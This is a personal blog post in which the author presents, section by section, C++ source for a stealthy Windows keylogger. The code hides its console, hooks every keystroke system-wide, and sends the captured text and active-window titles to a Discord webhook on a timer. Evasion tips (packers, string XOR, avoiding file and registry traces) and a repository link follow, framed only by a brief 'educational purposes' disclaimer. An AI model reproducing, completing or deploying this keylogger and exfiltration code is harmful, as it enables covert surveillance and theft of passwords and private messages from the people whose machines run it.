---
title: "Building My First Malware: Nobu.exe"
date: 2025-07-09 23:00:00 +0800
categories: [maldev]
tags: [cpp, discord, winapi, keylogger]
image:
  path: assets/Mal1/tir.jpg
  alt: Terror in resonance
---

> "Playing a game by youself is boring. You need a loser to crush so badly they can't recover." - Five
{: .prompt-quote }

Okay so I made a keylogger

Let’s be real for a second. After years of watching malware analysts dissect absolute garbage-tier EXEs made by script kiddies with too much free time and a cracked copy of Visual Studio, I thought: Hey. I can do that. Except less garbage. More cursed.
And here we are: a fully functioning Windows keylogger that lives in the shadows, siphons keystrokes like a digital vampire, and dumps the loot into a Discord webhook like it's sending confessions at 3AM.

All of this, by the way, is for educational purposes. Do not be a dumbass.

## The Anatomy of a Keylogger

### 1. Go Ghost or Go Home

```cpp
// Hide console window
void Stealth() {
#ifdef invisible
    HWND hwnd = GetConsoleWindow();
    if (hwnd) {
        ShowWindow(hwnd, SW_HIDE);
        FreeConsole();
    }
#endif
}

// Single instance check
hMutex = CreateMutexW(NULL, TRUE, L"Global\\MyKeyloggerMutex");
if (GetLastError() == ERROR_ALREADY_EXISTS) {
    if (hMutex) CloseHandle(hMutex);
    return 0;
}
```
{: .nolineno }

Hide the console. Check if there's already a clone of this malware running. If so, exit quietly like a ninja

---

### 2. Keyboard Hook Setup

```cpp
// Keyboard hook callback
LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        Save(kbdStruct->vkCode);
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() {
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
}
```
{: .nolineno }

We jam a hook straight into WH_KEYBOARD_LL. This means every key, across the OS, goes through us. That’s right, whether you’re writing an email or confessing to murder in Notepad, I see it all.

---

### 3. Key Processing and Special Characters

```cpp
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]"},
    {VK_RETURN, "\n"},
    {VK_SPACE, " "},
    // ... other special keys ...
};

int Save(int key_stroke) {
    std::string keystr;
    if (keyname.find(key_stroke) != keyname.end()) {
        keystr = keyname.at(key_stroke);
    } else {
        char key = MapVirtualKeyA(key_stroke, MAPVK_VK_TO_CHAR);
        if (key > 0) {
            keystr = std::string(1, key);
        }
    }
    // Append to buffer...
}
```
{: .nolineno }

You need to process it before storing. Special characters get converted. Everything else gets flushed into the buffer

---

### 4. Data Exfiltration to Discord

```cpp
bool SendToDiscord(const std::string& window_title, const std::string& keystrokes) {
    std::string json =
    "{"
    "   \"embeds\": [{"
    "       \"title\": \"Keystroke Capture\","
    "       \"color\": 16711680,"
    "       \"fields\": ["
    "           { \"name\": \"Active Window\", \"value\": \"" + EscapeJson(window_title) + "\", \"inline\": false },"
    "           { \"name\": \"Character Count\", \"value\": \"" + std::to_string(keystrokes.size()) + "\", \"inline\": true },"
    "           { \"name\": \"Logged Data\", \"value\": \"```" + EscapeJson(keystrokes) + "```\", \"inline\": false }"
    "       ],"
    "       \"timestamp\": \"" + GetISO8601Time() + "\""
    "   }]"
    "}";
    // HTTP POST via WinHTTP
}
```
{: .nolineno }

Look, spinning up a whole command-and-control server is effort, and I already wasted enough braincells. Discord webhooks? Easy. Fast. Fancy JSON. Stealthy as hell (unless you just dump the webhook link as a whole). Just make sure not to hit rate limits or maybe you enjoy watching logs disappear into the void.

![Webhook Output](assets/Mal1/jeba.png){: .normal w="700" h="300" style="border-radius: 16px;" }


---

### 5. Threading and Buffering

```cpp
std::string buffer;
std::mutex buffer_mutex;

void DiscordSender() {
    while (running) {
        Sleep(SEND_INTERVAL * 1000);
        
        std::string copy_keystrokes;
        std::string copy_window_title;
        {
            std::lock_guard<std::mutex> lock(buffer_mutex);
            if (buffer.empty()) continue;
            
            copy_keystrokes = buffer;
            copy_window_title = buffer_window_title;
            buffer.clear();
        }
        SendToDiscord(copy_window_title, copy_keystrokes);
    }
}
```
{: .nolineno }

Thread A logs your filthy typing habits. Thread B dumps it to Discord every few seconds. This is the digital equivalent of whispering secrets to a demon in the basement.

---

## Key Techniques and Challenges

### Evading Detection (add your self)

> + No file writes = no breadcrumbs
> + HTTPS = hide in plain sight
> + No registry = less whining
> + CPU use is subatomic
> + XOR your strings or obfuscate if you're paranoid, use packer or smthg

---

## What I Learned
- How keyboard hooks actually work
- Basic WinHTTP usage
- Thread sync with mutexes
- Buffering vs streaming exfiltration

---

## Sum up

This project made me realize something horrible and beautiful: malware is easy. Terrifyingly easy.
A few lines of C++, a bit of WinAPI black magic, and you’ve got a fully operational surveillance drone.
So... maybe trust less. Click less.
And always check your Task Manager for that one weird mutex.

---

> **GitHub Repo:**  
> [Nobu](https://github.com/FanzyBear/Nobu)
{: .prompt-info }


---